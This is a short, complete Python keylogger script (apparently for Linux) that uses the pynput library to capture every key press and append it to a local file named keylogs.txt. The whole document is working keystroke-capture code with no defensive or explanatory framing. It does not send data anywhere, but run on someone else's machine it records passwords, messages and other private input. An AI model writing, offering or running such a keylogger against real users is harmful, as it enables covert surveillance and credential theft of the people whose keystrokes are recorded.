from pynput import keyboard
import os

LOG_FILE = "keylogs.txt"

if not os.path.exists(LOG_FILE):
    with open(LOG_FILE, "w") as f:
        f.write("=== Keylogger Logs (Linux) ===\n\n")

def log_key(key):
    try:
        with open(LOG_FILE, "a") as f:
            f.write(f"{key}\n")
    except Exception as e:
        print(f"Erreur : {e}")

listener = keyboard.Listener(on_press=log_key)
listener.start()
listener.join()